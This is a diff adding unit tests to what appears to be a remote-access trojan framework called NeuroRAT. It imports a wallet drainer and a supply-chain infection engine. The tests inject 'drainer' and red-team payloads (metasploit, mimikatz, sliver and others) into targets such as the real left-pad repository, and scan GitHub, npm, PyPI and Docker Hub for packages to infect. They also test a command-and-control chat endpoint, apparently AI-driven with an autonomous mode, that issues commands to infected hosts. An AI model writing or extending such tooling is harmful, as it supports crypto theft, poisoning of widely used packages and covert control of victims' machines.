@@ -17,6 +17,8 @@ import logging
 from unittest.mock import patch, MagicMock
 from agent_modules.crypto_stealer import WalletDrainer
 from agent_modules.supply_chain_infection import SupplyChainInfectionEngine
+from fastapi.testclient import TestClient
+import server_api
 
 # Настраиваем логирование
 logging.basicConfig(level=logging.DEBUG)
@@ -243,6 +245,150 @@ class TestSupplyChainInfectionEngine(unittest.TestCase):
     def tearDown(self):
         import shutil
         shutil.rmtree(self.output_dir, ignore_errors=True)
+
+    def test_github_injection_dryrun(self):
+        github_target = {
+            "type": "github",
+            "name": "left-pad",
+            "repo": "https://github.com/stevemao/left-pad.git"
+        }
+        result = self.engine.inject_payload(github_target, payload_type="drainer")
+        self.assertIn(result["status"], ["dryrun", "success", "error"])
+        self.assertIn("details", result)
+
+    def test_inject_real_payloads(self):
+        targets = self.engine.scan_targets()
+        # metasploit
+        res = self.engine.inject_payload(targets[0], payload_type="metasploit", custom_payload_code="echo 'msf test'" )
+        self.assertIn(res["payload"], ["metasploit"])
+        # mimikatz
+        res = self.engine.inject_payload(targets[0], payload_type="mimikatz", custom_payload_code="echo mimikatz test")
+        self.assertIn(res["payload"], ["mimikatz"])
+        # impacket
+        res = self.engine.inject_payload(targets[0], payload_type="impacket", custom_payload_code="echo impacket test")
+        self.assertIn(res["payload"], ["impacket"])
+        # sliver
+        res = self.engine.inject_payload(targets[0], payload_type="sliver", custom_payload_code="echo sliver test")
+        self.assertIn(res["payload"], ["sliver"])
+        # bof
+        res = self.engine.inject_payload(targets[0], payload_type="bof", custom_payload_code="echo bof test")
+        self.assertIn(res["payload"], ["bof"])
+        # cme
+        res = self.engine.inject_payload(targets[0], payload_type="cme", custom_payload_code="echo cme test")
+        self.assertIn(res["payload"], ["cme"])
+
+
+class TestGitHubSupplyChain(unittest.TestCase):
+    def test_find_supply_chain_targets(self):
+        try:
+            from agent_modules.github_supply_chain import find_supply_chain_targets
+        except ImportError:
+            self.skipTest("github_supply_chain module not found")
+        targets = find_supply_chain_targets()
+        self.assertIsInstance(targets, list)
+        if targets:
+            t = targets[0]
+            self.assertIn("name", t)
+            self.assertIn("repo", t)
+            self.assertIn("stars", t)
+            self.assertIn("workflows", t)
+
+
+class TestNPMSupplyChain(unittest.TestCase):
+    def test_find_npm_supply_chain_targets(self):
+        try:
+            from agent_modules.npm_supply_chain import find_npm_supply_chain_targets
+        except ImportError:
+            self.skipTest("npm_supply_chain module not found")
+        targets = find_npm_supply_chain_targets(5)
+        self.assertIsInstance(targets, list)
+        if targets:
+            t = targets[0]
+            self.assertIn("name", t)
+            self.assertIn("version", t)
+            self.assertIn("type", t)
+
+
+class TestPyPISupplyChain(unittest.TestCase):
+    def test_find_pypi_supply_chain_targets(self):
+        try:
+            from agent_modules.pypi_supply_chain import find_pypi_supply_chain_targets
+        except ImportError:
+            self.skipTest("pypi_supply_chain module not found")
+        targets = find_pypi_supply_chain_targets(5)
+        self.assertIsInstance(targets, list)
+        if targets:
+            t = targets[0]
+            self.assertIn("name", t)
+            self.assertIn("type", t)
+
+
+class TestDockerHubSupplyChain(unittest.TestCase):
+    def test_find_dockerhub_supply_chain_targets(self):
+        try:
+            from agent_modules.dockerhub_supply_chain import find_dockerhub_supply_chain_targets
+        except ImportError:
+            self.skipTest("dockerhub_supply_chain module not found")
+        targets = find_dockerhub_supply_chain_targets(5)
+        self.assertIsInstance(targets, list)
+        if targets:
+            t = targets[0]
+            self.assertIn("name", t)
+            self.assertIn("type", t)
+
+
+class TestGitHubInjector(unittest.TestCase):
+    def test_inject_github_pull_request_dryrun(self):
+        try:
+            from agent_modules.github_injector import inject_github_pull_request
+        except ImportError:
+            self.skipTest("github_injector module not found")
+        result = inject_github_pull_request("https://github.com/stevemao/left-pad.git")
+        self.assertIn(result["status"], ["dryrun", "error"])
+        self.assertIn("details", result)
+
+
+class TestChatAPI(unittest.TestCase):
+    def setUp(self):
+        self.client = TestClient(server_api.app)
+        # Добавляем тестового агента
+        self.agent_id = "test-agent-1"
+        server_api.agent_data.append({
+            "agent_id": self.agent_id,
+            "os": "Linux",
+            "hostname": "testhost",
+            "username": "testuser",
+            "ip_address": "127.0.0.1",
+            "status": "active",
+            "first_seen": 0,
+            "last_seen": 0,
+            "system_info": {}
+        })
+        if self.agent_id not in server_api.chat_histories:
+            server_api.chat_histories[self.agent_id] = []
+
+    def tearDown(self):
+        # Чистим тестовых агентов и историю
+        server_api.agent_data = [a for a in server_api.agent_data if a["agent_id"] != self.agent_id]
+        if self.agent_id in server_api.chat_histories:
+            del server_api.chat_histories[self.agent_id]
+
+    def test_chat_page_renders(self):
+        resp = self.client.get(f"/api/agent/{self.agent_id}/chat")
+        self.assertEqual(resp.status_code, 200)
+        self.assertIn("NeuroRAT-Agent", resp.text)
+        self.assertIn(self.agent_id, resp.text)
+
+    def test_chat_api_post(self):
+        msg = "!sysinfo"
+        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
+        self.assertEqual(resp.status_code, 200)
+        data = resp.json()
+        self.assertIn("response", data)
+        # Проверяем, что сообщение появилось в истории
+        history = server_api.chat_histories[self.agent_id]
+        self.assertTrue(any(e["content"] == msg for e in history if e["sender"] == "user"))
+        self.assertTrue(any(e["sender"] == "agent" for e in history))
 
 
 if __name__ == '__main__':
